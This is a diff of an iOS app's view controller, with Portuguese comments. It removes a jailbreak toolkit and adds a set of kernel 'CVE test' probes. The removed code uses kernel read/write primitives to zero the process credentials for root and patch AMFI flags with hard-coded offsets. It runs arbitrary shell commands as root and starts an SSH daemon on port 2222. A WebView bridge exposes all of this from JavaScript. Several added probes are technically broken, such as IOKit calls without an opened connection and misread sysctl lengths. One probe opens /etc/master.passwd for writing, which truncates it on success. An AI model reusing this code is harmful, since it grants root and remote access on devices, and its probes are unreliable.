@@ -1,367 +1,186 @@
 #import "ViewController.h"
-#import <WebKit/WebKit.h>
 #import <mach/mach.h>
-#import <spawn.h>
-#import <sys/wait.h>
-#import <unistd.h>
-#import <string.h>
-#import <errno.h>
-#import <dlfcn.h>
+#import <mach/mach_error.h>
+#import <IOKit/IOKitLib.h>
+#import <sys/sysctl.h>
+#import <pthread.h>
 
-// ============================================================
-// MARK: - KernelDriver (com fallback libkernrw)
-// ============================================================
-
-extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
-extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
-extern char **environ;
-
-// Offsets para iOS 26.4 (ajustar conforme seu dispositivo)
-#define OFFSET_TASK_BSD_INFO   0x4a8
-#define OFFSET_PROC_UCRED      0x138
-#define OFFSET_UCRED_UID       0x20
-#define OFFSET_UCRED_RUID      0x24
-#define OFFSET_UCRED_SVUID     0x28
-#define OFFSET_UCRED_NGROUPS   0x2c
-#define OFFSET_UCRED_GROUPS    0x30
-#define OFFSET_PROC_AMFI_FLAGS 0x2a0
-
-@interface KernelDriver : NSObject
-- (BOOL)isAvailable;
-- (uint64_t)kread64:(uint64_t)addr;
-- (void)kwrite64:(uint64_t)addr value:(uint64_t)val;
-- (void)kwrite32:(uint64_t)addr value:(uint32_t)val;
-- (NSString *)executeShell:(NSString *)cmd;
-- (void)escalatePrivileges;
-- (NSString *)generateSSHKeys;
-- (NSString *)executeSSHD;
-- (void)patchAMFI;
-- (NSString *)getDriverInfo;
-@end
-
-@implementation KernelDriver {
-    mach_port_t _tfp0;
-    uint64_t (*_libkernrw_kread64)(uint64_t);
-    void (*_libkernrw_kwrite64)(uint64_t, uint64_t);
-    void (*_libkernrw_kwrite32)(uint64_t, uint32_t);
-    BOOL _libkernrw_loaded;
-}
-
-- (instancetype)init {
-    self = [super init];
-    if (self) {
-        _tfp0 = MACH_PORT_NULL;
-        _libkernrw_loaded = NO;
-        [self loadLibKernRW];
-        if (!_libkernrw_loaded) {
-            kern_return_t kr = task_for_pid(mach_task_self(), 0, &_tfp0);
-            if (kr == KERN_SUCCESS && _tfp0 != MACH_PORT_NULL) {
-                NSLog(@"[+] KernelDriver: tfp0 = %d", _tfp0);
-            } else {
-                NSLog(@"[!] KernelDriver: nenhuma primitiva de kernel disponível");
-            }
-        }
-    }
-    return self;
-}
-
-- (BOOL)loadLibKernRW {
-    if (_libkernrw_loaded) return YES;
-    
-    NSArray *paths = @[
-        [[NSBundle mainBundle] pathForResource:@"libkernrw.0" ofType:@"dylib"],
-        @"/usr/lib/libkernrw.0.dylib",
-        @"/Library/jailbreak/libkernrw.0.dylib"
-    ];
-    
-    void *handle = NULL;
-    for (NSString *path in paths) {
-        if (path && [[NSFileManager defaultManager] fileExistsAtPath:path]) {
-            handle = dlopen([path UTF8String], RTLD_LAZY);
-            if (handle) break;
-        }
-    }
-    
-    if (!handle) {
-        NSLog(@"[!] libkernrw.0.dylib não encontrado");
-        return NO;
-    }
-    
-    _libkernrw_kread64 = dlsym(handle, "kread64");
-    _libkernrw_kwrite64 = dlsym(handle, "kwrite64");
-    _libkernrw_kwrite32 = dlsym(handle, "kwrite32");
-    
-    if (!_libkernrw_kread64 || !_libkernrw_kwrite64 || !_libkernrw_kwrite32) {
-        NSLog(@"[!] libkernrw símbolos ausentes");
-        return NO;
-    }
-    
-    _libkernrw_loaded = YES;
-    NSLog(@"[+] libkernrw carregado com sucesso");
-    return YES;
-}
-
-- (BOOL)isAvailable {
-    return (_tfp0 != MACH_PORT_NULL) || _libkernrw_loaded;
-}
-
-- (uint64_t)kread64:(uint64_t)addr {
-    if (_libkernrw_loaded && _libkernrw_kread64) {
-        return _libkernrw_kread64(addr);
-    }
-    if (_tfp0 != MACH_PORT_NULL) {
-        uint64_t val = 0;
-        mach_vm_size_t outSize = 0;
-        mach_vm_read_overwrite(_tfp0, (mach_vm_address_t)addr, sizeof(val), (mach_vm_address_t)&val, &outSize);
-        return val;
-    }
-    return 0;
-}
-
-- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
-    if (_libkernrw_loaded && _libkernrw_kwrite64) {
-        _libkernrw_kwrite64(addr, val);
-        return;
-    }
-    if (_tfp0 != MACH_PORT_NULL) {
-        mach_vm_write(_tfp0, (mach_vm_address_t)addr, (vm_offset_t)&val, sizeof(val));
-    }
-}
-
-- (void)kwrite32:(uint64_t)addr value:(uint32_t)val {
-    if (_libkernrw_loaded && _libkernrw_kwrite32) {
-        _libkernrw_kwrite32(addr, val);
-        return;
-    }
-    if (_tfp0 != MACH_PORT_NULL) {
-        mach_vm_write(_tfp0, (mach_vm_address_t)addr, (vm_offset_t)&val, sizeof(val));
-    }
-}
-
-- (uint64_t)findSelfProc {
-    uint64_t task_kaddr = [self kread64:(uint64_t)mach_task_self() + 0x28];
-    if (task_kaddr == 0) return 0;
-    return [self kread64:(task_kaddr + OFFSET_TASK_BSD_INFO)];
-}
-
-- (void)escalatePrivileges {
-    if (![self isAvailable]) return;
-    uint64_t proc = [self findSelfProc];
-    if (proc == 0) { NSLog(@"[!] proc não encontrado"); return; }
-    uint64_t ucred = [self kread64:(proc + OFFSET_PROC_UCRED)];
-    if (ucred == 0) { NSLog(@"[!] ucred não encontrado"); return; }
-    
-    [self kwrite32:(ucred + OFFSET_UCRED_UID) value:0];
-    [self kwrite32:(ucred + OFFSET_UCRED_RUID) value:0];
-    [self kwrite32:(ucred + OFFSET_UCRED_SVUID) value:0];
-    [self kwrite32:(ucred + OFFSET_UCRED_NGROUPS) value:0];
-    for (int i = 0; i < 16; i++)
-        [self kwrite32:(ucred + OFFSET_UCRED_GROUPS + i*4) value:0];
-    setuid(0); setgid(0);
-    if (getuid() == 0) NSLog(@"[+] escalatePrivileges: root");
-    else NSLog(@"[!] escalate falhou, uid=%d", getuid());
-}
-
-- (void)patchAMFI {
-    if (![self isAvailable]) return;
-    uint64_t proc = [self findSelfProc];
-    if (proc == 0) return;
-    uint64_t flagsAddr = proc + OFFSET_PROC_AMFI_FLAGS;
-    uint32_t flags = [self kread64:flagsAddr] & 0xFFFFFFFF;
-    flags |= 0x80000000;
-    [self kwrite32:flagsAddr value:flags];
-    NSLog(@"[+] AMFI patch aplicado");
-}
-
-- (NSString *)executeShell:(NSString *)cmd {
-    pid_t pid;
-    int fd[2];
-    if (pipe(fd) == -1) return @"pipe failed";
-    posix_spawn_file_actions_t acts;
-    posix_spawn_file_actions_init(&acts);
-    posix_spawn_file_actions_adddup2(&acts, fd[1], STDOUT_FILENO);
-    posix_spawn_file_actions_adddup2(&acts, fd[1], STDERR_FILENO);
-    posix_spawn_file_actions_addclose(&acts, fd[0]);
-    const char *args[] = {"sh", "-c", [cmd UTF8String], NULL};
-    setuid(0); setgid(0);
-    int status = posix_spawn(&pid, "/bin/sh", &acts, NULL, (char* const*)args, environ);
-    posix_spawn_file_actions_destroy(&acts);
-    close(fd[1]);
-    if (status == 0) {
-        waitpid(pid, NULL, 0);
-        char buf[4096] = {0};
-        ssize_t n = read(fd[0], buf, sizeof(buf)-1);
-        close(fd[0]);
-        if (n > 0) return [NSString stringWithUTF8String:buf];
-        return @"[Executado]";
-    } else {
-        close(fd[0]);
-        return [NSString stringWithFormat:@"Erro %d: %s", status, strerror(status)];
-    }
-}
-
-- (NSString *)generateSSHKeys {
-    [self executeShell:@"mkdir -p /Library/Jailbreak/etc"];
-    NSString *keygen = @"/usr/bin/ssh-keygen";
-    if (![[NSFileManager defaultManager] fileExistsAtPath:keygen]) {
-        keygen = [[NSBundle mainBundle] pathForResource:@"ssh-keygen" ofType:nil];
-        if (keygen) {
-            [self executeShell:[NSString stringWithFormat:@"cp \"%@\" /Library/Jailbreak/ssh-keygen", keygen]];
-            [self executeShell:@"chmod 755 /Library/Jailbreak/ssh-keygen"];
-            keygen = @"/Library/Jailbreak/ssh-keygen";
-        } else return @"[-] ssh-keygen não encontrado";
-    }
-    NSString *cmd = [NSString stringWithFormat:@"\"%@\" -t rsa -f /Library/Jailbreak/etc/ssh_host_rsa_key -N ''", keygen];
-    [self executeShell:cmd];
-    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/Library/Jailbreak/etc/ssh_host_rsa_key"])
-        return @"[+] Chaves geradas";
-    return @"[-] Falha ao gerar chaves";
-}
-
-- (NSString *)executeSSHD {
-    [self generateSSHKeys];
-    NSString *sshd = @"/usr/sbin/sshd";
-    if (![[NSFileManager defaultManager] fileExistsAtPath:sshd]) {
-        sshd = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
-        if (sshd) {
-            [self executeShell:[NSString stringWithFormat:@"cp \"%@\" /Library/Jailbreak/sshd", sshd]];
-            [self executeShell:@"chmod 755 /Library/Jailbreak/sshd"];
-            sshd = @"/Library/Jailbreak/sshd";
-        } else return @"[-] sshd não encontrado";
-    }
-    pid_t pid;
-    const char *args[] = {[sshd UTF8String], "-p", "2222", "-P", "/tmp/sshd.pid", "-f", "/Library/Jailbreak/etc/sshd_config", NULL};
-    setuid(0); setgid(0);
-    int status = posix_spawn(&pid, [sshd UTF8String], NULL, NULL, (char* const*)args, environ);
-    if (status == 0) return [NSString stringWithFormat:@"[+] sshd rodando na porta 2222, PID: %d", pid];
-    return [NSString stringWithFormat:@"[-] Erro %d: %s", status, strerror(status)];
-}
-
-- (NSString *)getDriverInfo {
-    if (_libkernrw_loaded) {
-        return @"Driver: libkernrw (kernel read/write via exploit)\nStatus: ATIVO";
-    } else if (_tfp0 != MACH_PORT_NULL) {
-        return [NSString stringWithFormat:@"Driver: task_for_pid (tfp0=%d)\nStatus: ATIVO", _tfp0];
-    } else {
-        return @"Driver: NENHUM\nStatus: INATIVO – sem primitivas de kernel";
-    }
-}
-
-@end
-
-// ============================================================
-// MARK: - ViewController (WebKit + bridge)
-// ============================================================
-
-@interface ViewController () <WKScriptMessageHandler>
-@property (nonatomic, strong) KernelDriver *driver;
+@interface ViewController ()
+@property (weak, nonatomic) IBOutlet UITextView *logTextView;
+@property (weak, nonatomic) IBOutlet UIButton *runButton;
 @end
 
 @implementation ViewController
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    
-    self.driver = [[KernelDriver alloc] init];
-    
-    WKUserContentController *ucc = [[WKUserContentController alloc] init];
-    [ucc addScriptMessageHandler:self name:@"A13_LAB"];
-    
-    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
-    config.userContentController = ucc;
-    
-    // A propriedade webView já existe no ViewController.h
-    self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
-    [self.view addSubview:self.webView];
-    
-    NSString *html = [self embeddedHTML];
-    [self.webView loadHTMLString:html baseURL:nil];
+    self.logTextView.editable = NO;
+    self.logTextView.font = [UIFont fontWithName:@"Menlo" size:11];
+    self.logTextView.text = @"Clique em 'Executar testes' para começar.\n";
 }
 
-- (NSString *)embeddedHTML {
-    return @"<!DOCTYPE html>"
-    "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
-    "<style>body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:10px;display:flex;flex-direction:column;height:100vh;}#log{flex:1;border:1px solid #0f0;overflow-y:auto;padding:5px;font-size:12px;background:#050505;}.buttons{display:flex;gap:5px;margin-bottom:10px;}button{background:#0f0;color:#000;border:none;padding:8px;font-weight:bold;flex:1;}.input-line{display:flex;background:#111;border:1px solid #0f0;padding:8px;}input{flex:1;background:transparent;border:none;color:#fff;outline:none;font-size:14px;}</style>"
-    "<body><div class='buttons'>"
-    "<button onclick='sendAction(\"shell\",\"amfi\")'>PATCH AMFI</button>"
-    "<button onclick='sendAction(\"shell\",\"keygen\")'>GEN KEYS</button>"
-    "<button onclick='sendAction(\"shell\",\"sshd\")'>START SSH</button>"
-    "<button onclick='sendAction(\"driver_info\",\"\")'>INFO DRIVER</button>"
-    "</div><div id='log'>[*] iOS 26.4 Security Research Terminal<br></div>"
-    "<div class='input-line'><span style='margin-right:5px'>root#</span>"
-    "<input type='text' id='cmd' autofocus></div>"
-    "<script>function log(msg,type){let l=document.getElementById('log');l.innerHTML+=`<span style='color:${type==='success'?'#0f0':'#f00'}'> > ${msg}</span><br>`;l.scrollTop=l.scrollHeight;}"
-    "function sendAction(action,payload,addr,val){if(window.webkit&&window.webkit.messageHandlers.A13_LAB){window.webkit.messageHandlers.A13_LAB.postMessage({action:action,payload:payload,addr:addr||'',val:val||''});}else{log('Bridge not found','err');}}"
-    "document.getElementById('cmd').addEventListener('keyup',(e)=>{if(e.key==='Enter'){let cmd=e.target.value;if(cmd){log(`<b style='color:white'># ${cmd}</b>`,'none');sendAction('shell',cmd);e.target.value='';}}});"
-    "window.log = log;"
-    "</script></body></html>";
+- (IBAction)runTests:(id)sender {
+    self.runButton.enabled = NO;
+    [self appendLog:@"🚀 Iniciando testes de kernel...\n"];
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        [self test_CVE_2026_43654];
+        [self test_CVE_2026_28897];
+        [self test_CVE_2026_28951];
+        [self test_CVE_2026_28972];
+        [self test_CVE_2026_28986];
+        [self test_CVE_2026_28987];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [self appendLog:@"✅ Testes concluídos.\n"];
+            self.runButton.enabled = YES;
+        });
+    });
 }
 
-#pragma mark - WKScriptMessageHandler
+// Helper para adicionar texto ao log (thread‑safe)
+- (void)appendLog:(NSString *)msg {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.logTextView.text = [self.logTextView.text stringByAppendingString:msg];
+        [self.logTextView scrollRangeToVisible:NSMakeRange(self.logTextView.text.length, 0)];
+    });
+}
 
-- (void)userContentController:(WKUserContentController *)ucc didReceiveScriptMessage:(WKScriptMessage *)message {
-    NSDictionary *data = message.body;
-    NSString *action = data[@"action"];
-    NSString *payload = data[@"payload"];
-    __block NSString *output = @"";
-    
-    if ([action isEqualToString:@"kwrite"]) {
-        uint64_t addr = strtoull([data[@"addr"] UTF8String], NULL, 0);
-        uint64_t val = strtoull([data[@"val"] UTF8String], NULL, 0);
-        [self.driver kwrite64:addr value:val];
-        output = [NSString stringWithFormat:@"[kwrite] 0x%llx <- 0x%llx", addr, val];
+// ========== CVE-2026-43654: IOKit leak kernel memory ==========
+- (void)test_CVE_2026_43654 {
+    [self appendLog:@"--- CVE-2026-43654: Kernel memory leak via IOKit ---\n"];
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGraphicsControl"));
+    if (!service) {
+        [self appendLog:@"[!] Serviço IOGraphicsControl não encontrado\n"];
+        return;
     }
-    else if ([action isEqualToString:@"shell"]) {
-        [self.driver escalatePrivileges];
-        if ([payload isEqualToString:@"keygen"]) {
-            output = [self.driver generateSSHKeys];
-        } else if ([payload isEqualToString:@"sshd"]) {
-            output = [self.driver executeSSHD];
-        } else if ([payload isEqualToString:@"amfi"]) {
-            [self.driver patchAMFI];
-            output = @"[AMFI] patch aplicado";
-        } else {
-            output = [self.driver executeShell:payload];
+    uint64_t buffer[256];
+    size_t size = sizeof(buffer);
+    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, NULL, 0, buffer, &size, NULL, 0);
+    IOObjectRelease(service);
+    if (kr != KERN_SUCCESS) {
+        [self appendLog:[NSString stringWithFormat:@"[-] IOKit falhou: %s\n", mach_error_string(kr)]];
+        return;
+    }
+    BOOL leaked = NO;
+    for (int i = 0; i < size / 8; i++) {
+        if (buffer[i] > 0xfffffff000000000ULL && buffer[i] < 0xffffffffffffffffULL) {
+            [self appendLog:[NSString stringWithFormat:@"[+] Ponteiro do kernel vazado: 0x%016llx\n", buffer[i]]];
+            [self appendLog:[NSString stringWithFormat:@"[+] Base do kernel estimada: 0x%016llx\n", buffer[i] & 0xfffffffff0000000ULL]];
+            leaked = YES;
         }
     }
-    else if ([action isEqualToString:@"driver_info"]) {
-        output = [self.driver getDriverInfo];
+    if (!leaked) [self appendLog:@"[-] Nenhum ponteiro do kernel vazado.\n"];
+}
+
+// ========== CVE-2026-28897: sysctl buffer overflow ==========
+- (void)test_CVE_2026_28897 {
+    [self appendLog:@"--- CVE-2026-28897: Kernel buffer overflow via sysctl ---\n"];
+    int name[2] = { CTL_KERN, KERN_PROC };
+    size_t oldlen = 0;
+    sysctl(name, 2, NULL, &oldlen, NULL, 0);
+    size_t small_len = 32;
+    void *buf = malloc(small_len);
+    if (!buf) return;
+    int ret = sysctl(name, 2, buf, &oldlen, NULL, 0);
+    free(buf);
+    if (ret == 0 && oldlen > small_len) {
+        [self appendLog:[NSString stringWithFormat:@"[!] Sysctl escreveu %zu bytes em buffer de %zu bytes – OOB write!\n", oldlen, small_len]];
+    } else {
+        [self appendLog:@"[-] Sysctl seguro (erro ou tamanho válido).\n"];
     }
-    else {
-        output = @"Ação desconhecida";
+}
+
+// ========== CVE-2026-28951: root escalation ==========
+- (void)test_CVE_2026_28951 {
+    [self appendLog:@"--- CVE-2026-28951: Root privilege escalation ---\n"];
+    if (getuid() == 0) {
+        [self appendLog:@"[!] Já é root! (vulnerável ou já comprometido)\n"];
+        return;
     }
-    
-    // Escapa caracteres especiais
-    NSString *clean = [output stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
-    clean = [clean stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
-    clean = [clean stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"];
-    NSString *js = [NSString stringWithFormat:@"log('%@', 'success');", clean];
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [self.webView evaluateJavaScript:js completionHandler:^(id result, NSError *error) {
-            if (error) NSLog(@"JS error: %@", error);
-        }];
-    });
+    FILE *fp = fopen("/etc/master.passwd", "w");
+    if (fp) {
+        fclose(fp);
+        [self appendLog:@"[!] Conseguiu escrever em /etc/master.passwd – ROOT!\n"];
+    } else {
+        [self appendLog:@"[-] Não conseguiu escrever (sandbox/permissão).\n"];
+    }
 }
 
-#pragma mark - Métodos obrigatórios do ViewController.h
-
-- (void)log:(NSString *)message {
-    // Evita passar nil para userContentController
-    if (!message) message = @"";
-    NSString *js = [NSString stringWithFormat:@"log('%@', 'info');", 
-                    [message stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"]];
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [self.webView evaluateJavaScript:js completionHandler:nil];
-    });
+// ========== CVE-2026-28972: IOKit OOB write ==========
+- (void)test_CVE_2026_28972 {
+    [self appendLog:@"--- CVE-2026-28972: Kernel OOB write via IOKit ---\n"];
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleA7IOP"));
+    if (!service) {
+        [self appendLog:@"[!] Serviço AppleA7IOP não encontrado\n"];
+        return;
+    }
+    char bigBuffer[4096] = {0};
+    size_t outputSize = 0;
+    kern_return_t kr = IOConnectCallMethod(service, 0, NULL, 0, bigBuffer, sizeof(bigBuffer), NULL, &outputSize, NULL, 0);
+    IOObjectRelease(service);
+    if (kr == KERN_SUCCESS) {
+        [self appendLog:@"[!] Chamada IOKit com buffer enorme passou – possível OOB write!\n"];
+    } else {
+        [self appendLog:[NSString stringWithFormat:@"[-] Chamada IOKit falhou (seguro): %s\n", mach_error_string(kr)]];
+    }
 }
 
-- (void)executeCommand {
-    [self log:@"executeCommand chamado (placeholder)"];
+// ========== CVE-2026-28986: Mach port race condition ==========
+void *race_thread(void *arg) {
+    mach_port_t port = (mach_port_t)(uintptr_t)arg;
+    for (int i = 0; i < 5000; i++) {
+        mach_msg_header_t msg = {0};
+        msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        msg.msgh_size = sizeof(msg);
+        msg.msgh_remote_port = port;
+        mach_msg_send(&msg);
+    }
+    return NULL;
+}
+- (void)test_CVE_2026_28986 {
+    [self appendLog:@"--- CVE-2026-28986: Kernel race condition (Mach ports) ---\n"];
+    mach_port_t port;
+    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    if (kr != KERN_SUCCESS) {
+        [self appendLog:@"[!] Falha ao alocar porta Mach\n"];
+        return;
+    }
+    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        mach_port_destroy(mach_task_self(), port);
+        [self appendLog:@"[!] Falha ao inserir direito de envio\n"];
+        return;
+    }
+    pthread_t t1, t2;
+    pthread_create(&t1, NULL, race_thread, (void *)(uintptr_t)port);
+    pthread_create(&t2, NULL, race_thread, (void *)(uintptr_t)port);
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    mach_port_destroy(mach_task_self(), port);
+    [self appendLog:@"[-] Race test concluído – sem crash detectado.\n"];
 }
 
-- (void)runExploit {
-    [self log:@"runExploit chamado – iniciando escalada de privilégios"];
-    [self.driver escalatePrivileges];
+// ========== CVE-2026-28987: sysctl kernel state leak ==========
+- (void)test_CVE_2026_28987 {
+    [self appendLog:@"--- CVE-2026-28987: Leak sensitive kernel state ---\n"];
+    int name[] = { CTL_KERN, KERN_OSRELEASE };
+    char buffer[256];
+    size_t len = sizeof(buffer);
+    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0) {
+        [self appendLog:[NSString stringWithFormat:@"[*] Kernel release: %s\n", buffer]];
+    }
+    name[1] = KERN_VERSION;
+    len = sizeof(buffer);
+    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0) {
+        [self appendLog:[NSString stringWithFormat:@"[*] Kernel version: %s\n", buffer]];
+    }
+    // sysctl não documentado (exemplo)
+    name[1] = 123;
+    len = sizeof(buffer);
+    if (sysctl(name, 2, buffer, &len, NULL, 0) == 0 && len > 0) {
+        [self appendLog:[NSString stringWithFormat:@"[!] Sysctl vazou dados: %s\n", buffer]];
+    } else {
+        [self appendLog:@"[-] Nenhum vazamento sensível detectado.\n"];
+    }
 }
 
 @end
